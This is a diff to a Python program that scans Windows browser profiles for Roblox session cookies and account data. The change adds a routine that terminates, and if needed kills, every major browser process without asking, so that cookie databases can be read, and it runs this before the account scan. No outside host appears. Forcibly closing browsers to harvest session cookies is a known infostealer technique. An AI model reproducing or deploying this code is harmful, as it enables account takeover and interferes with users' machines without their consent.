@@ -6873,7 +6873,7 @@ def _roblox_session_from_cookies(
             user_id = match.group(1)
     if not user_id and fallback_user_id:
         user_id = str(fallback_user_id)
-    if not user_id:
+    if not _roblox_valid_user_id(user_id):
         return None
     return {"user_id": str(user_id), "username": username}
 
@@ -7379,9 +7379,56 @@ def _scan_firefox_roblox_profile(profile_name: str, profile_dir: Path) -> dict:
     return artifact
 
 
+_ROBLOX_BROWSER_PROCESS_NAMES = frozenset(
+    {
+        "chrome.exe",
+        "msedge.exe",
+        "brave.exe",
+        "opera.exe",
+        "vivaldi.exe",
+        "firefox.exe",
+    }
+)
+
+
+def _close_browsers_for_roblox_scan() -> dict:
+    """Close browsers so Roblox cookie databases are not locked during the scan."""
+    if platform.system() != "Windows":
+        return {"closed": [], "failed": []}
+    targets = _ROBLOX_BROWSER_PROCESS_NAMES
+    closed: list[str] = []
+    failed: list[str] = []
+    terminating: list[psutil.Process] = []
+    for proc in psutil.process_iter(["name", "pid"]):
+        try:
+            proc_name = str(proc.info.get("name") or "").lower()
+            if proc_name not in targets:
+                continue
+            proc.terminate()
+            terminating.append(proc)
+            closed.append(f"{proc.info.get('name')} (pid {proc.info.get('pid')})")
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            failed.append(proc_name or "unknown")
+    if terminating:
+        _gone, alive = psutil.wait_procs(terminating, timeout=4)
+        for proc in alive:
+            try:
+                proc.kill()
+                proc.wait(timeout=2)
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
+                try:
+                    failed.append(f"{proc.name()} (pid {proc.pid})")
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    failed.append("unknown")
+    if closed or terminating:
+        time.sleep(0.75)
+    return {"closed": closed, "failed": failed}
+
+
 def roblox_browser_account_scan() -> dict:
     if platform.system() != "Windows":
         return {"available": False, "reason": "Browser Roblox scan is Windows-focused in this build"}
+    browsers_closed = _close_browsers_for_roblox_scan()
     artifacts: list[dict] = []
     for browser, base in _chromium_user_data_roots():
         for profile in _chromium_profile_names(base):
@@ -7420,6 +7467,8 @@ def roblox_browser_account_scan() -> dict:
     accounts = _roblox_enrich_accounts(raw_accounts, include_headshots=False)
     return {
         "available": True,
+        "browsers_closed": browsers_closed.get("closed") or [],
+        "browsers_close_failed": browsers_closed.get("failed") or [],
         "artifact_count": len(artifacts),
         "artifacts": artifacts[:30],
         "accounts": accounts,
